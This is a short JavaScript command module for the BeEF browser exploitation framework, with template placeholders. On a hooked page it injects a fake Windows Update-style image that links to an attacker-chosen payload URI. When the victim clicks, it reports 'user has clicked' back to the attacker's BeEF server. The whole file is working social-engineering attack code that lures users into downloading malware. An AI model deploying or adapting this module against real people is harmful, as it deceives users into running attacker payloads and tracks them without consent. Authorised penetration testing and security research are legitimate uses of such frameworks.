beef.execute(function() {
  var image = "<%== @image %>";
  var payload_uri = "<%== @payload_uri %>";
  var beef_root = beef.net.httpproto + "://" + beef.net.host + ":" + beef.net.port;
  var payload = "";

  var winupdatediv = document.createElement('div');
  winupdatediv.setAttribute('id', 'winupdatediv');
  winupdatediv.setAttribute('style', 'position:absolute; top:90%; left:80%; z-index:51; bottom:0;');
  document.body.appendChild(winupdatediv);
  winupdatediv.innerHTML = "<a href=\"" + payload_uri + "\" target=\"_blank\" ><img src=\"" + image + "\" /></a>";

  $j("#winupdatediv").click(function () {
    $j(this).hide();
    document.body.removeChild(winupdatediv);
    beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=user has clicked');
  });

});
